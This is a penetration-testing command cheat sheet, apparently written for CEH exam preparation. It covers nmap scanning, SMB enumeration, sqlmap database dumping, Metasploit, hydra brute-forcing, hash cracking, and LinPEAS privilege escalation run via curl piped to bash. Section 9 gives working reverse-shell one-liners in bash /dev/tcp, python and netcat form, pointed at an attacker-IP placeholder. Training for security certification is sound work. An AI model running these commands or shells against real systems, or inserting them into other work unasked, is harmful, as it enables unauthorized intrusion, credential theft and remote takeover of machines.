# CEH-checklist
This is reference command sheet

Reference: https://docs.google.com/document/d/1sm78ncyHdOIr4OiC4dDuAHiOrzQCvA1sZKJDR4l90Vg

https://drive.google.com/file/d/1PKlihEc1DbobRUt2tvLO_jtoQh1kPd73/view?usp=sharing

1. Recon & Scanning
Nmap — fast network discovery (active hosts)
Ping/host discovery (fast):
nmap -sn -T4 10.10.0.0/24

ARP-based fast discovery (Linux, local network):
arp-scan --interface=eth0 --localnet

Scan all TCP ports on one IP (fast-ish):
nmap -T4 -p- <IP>

After ports found, full service/version + scripts on specific ports:
nmap -T4 -A -p 22,80,139,445 <IP>

Alternative focused: service/version + default scripts
nmap -sV -sC -p 22,80,443 <IP>

Useful flags: -oA <basename> (save formats), -Pn (skip ping), -sS (SYN), -sU (UDP), --script vuln
Note: you asked about -pN — that is not a standard nmap port flag. Use -p- to scan all ports and -Pn to skip host discovery.
Netdiscover
Passive/ARP discovery on LAN:
netdiscover -i eth0 -r 10.10.0.0/24

Simple interactive scan (auto range):
netdiscover

enum4linux (enumeration)/ smbclient
Full enumeration:
enum4linux -a <IP>
Specific options: -u <user> -p <pass> -oX <xml> if needed.
smbclient //TARGET_IP/SHARE_NAME -U username
smbclient //192.168.1.10/public -N
smbclient -L //TARGET_IP -U username
get filename

2. Web & API attacks
dirb (directory brute force)
Basic run with SecLists:
dirb http://<IP>/ /usr/share/wordlists/dirb/common.txt -o dirb_output.txt

Use medium or big wordlists for deeper discovery.
Nikto (web scanner) / WPScan
nikto -h http://<IP> -o nikto_output.txt
Use -C all to show all checks; -Tuning to limit tests.
wpscan --url http://<IP> --enumerate u,p,t
wpscan --url http://<IP> -U user -P rockyou.txt
sqlmap (automated SQLi)
Simple detection + DB list (non-interactive):
sqlmap -u "http://<IP>/vuln.php?id=1" --batch --dbs

Retrieve table/columns and dump a table:
sqlmap -u "http://<IP>/vuln.php?id=1" --tables -D <db_name>
sqlmap -u "http://<IP>/vuln.php?id=1" -D <db_name> -T <table> --dump

For APIs, test JSON parameters via -p and --data='{"param":1}'.


3. Exploitation
Metasploit quick flow
msfconsole
search <service_or_exploit>
use exploit/<path>
set RHOSTS <IP>
set RPORT <port>
set PAYLOAD <payload>
set LHOST <your_ip>
set LPORT <your_port>
check   # if available
exploit

Common payloads: linux/x86/meterpreter/reverse_tcp, windows/x64/meterpreter/reverse_tcp.
Save workspace and notes: workspace -a <name> then db_export <file>.
exploit-db / searchsploit
Search locally with searchsploit:
searchsploit <product_or_cve>

Copy an exploit for testing:
searchsploit -m <result-path>

Use Exploit-DB web for proof-of-concept code when needed.

4. Brute & Password cracking
Hydra (online brute)
SSH example:
hydra -l <user> -P /path/to/wordlist.txt ssh://<IP> -t 4

HTTP form example (adjust fields and paths):
hydra -L users.txt -P passwords.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

John the Ripper (offline)
Prepare and run john:
john --wordlist=/usr/share/wordlists/rockyou.txt --format=<format> hashes.txt

Show cracked:
john --show hashes.txt

Hashcat (GPU/fast cracking)
hashid hash.txt - to discover the type of hash
Basic run (identify -m with hash-identifier):
hashcat -m <hash_mode> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O -w3

Rules, masks and hybrid attacks are common in exam scenarios.

5. Post‑exploitation & PrivEsc
LinPEAS (Linux privilege escalation)
Download & run from your machine (HTTP served):
wget http://<your_server>/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

Or run via curl and pipe: curl -sL <url>/linpeas.sh | bash (if allowed in lab).
GTFOBins — privileged command abuse
Quick reference: https://gtfobins.github.io
Example: find SUID binaries and consult GTFOBins for exploitation vectors:
find / -perm -4000 -type f 2>/dev/null | less


6. Packet analysis
tcpdump
Capture traffic to file:
tcpdump -i eth0 -w /tmp/capture.pcap host <IP>

Capture HTTP only:
tcpdump -i eth0 -w http.pcap port 80

Wireshark
Open capture.pcap in Wireshark for GUI analysis. Use filters, e.g. http, ip.addr==10.10.0.5, tcp.port==22.

7. Stego & Basic Forensics
steghide
Extract from JPG/PNG:
steghide extract -sf secret.jpg -xf out -p <password>

OpenStego
Use GUI or CLI to extract hidden payloads (follow tool docs).
strings (quick forensic check)
Extract readable strings from binary or memory dump:
strings memory.raw | less

volatility (memory analysis)
Basic process listing example:
volatility -f memory.raw --profile=Win7SP1x64 pslist


8. Wordlists
SecLists location (common on Kali): /usr/share/seclists
Useful lists:
Discovery/Web-Content/common.txt (dirb/dirbuster)
Passwords/rockyou.txt (passwords)
Usernames/top-usernames-shortlist.txt

9. Reverse shells 
Use only for authorized labs.
bash (simple):
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

python3 (one‑liner):
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("<attacker_ip>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"])'

nc (OpenBSD netcat with -e):
nc -e /bin/sh <attacker_ip> <port>

nc (traditional netcat without -e):
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> > /tmp/f


10. Quick evidence & documentation template 
Target: <IP>
Task: <short description>
Commands run:
- nmap ...
- dirb ...
Output / Evidence (attach screenshots or paste output):
- /root/exploits/out.txt
Notes: <root or user found, persistence, flags saved>


11. Quick exam tips
Always save outputs: > out.txt or tee out.txt and take screenshots with timestamps.
Keep a notes.md or report.txt and append each completed task.
If stuck, mark the challenge, move on, return later.

12. Useful links
GTFOBins — privilege abuse: https://gtfobins.github.io
SecLists (GitHub): https://github.com/danielmiessler/SecLists
Exploit-DB: https://www.exploit-db.com
SearchSploit (local tool included with Exploit-DB): searchsploit (CLI)
SQLMap docs: https://github.com/sqlmapproject/sqlmap
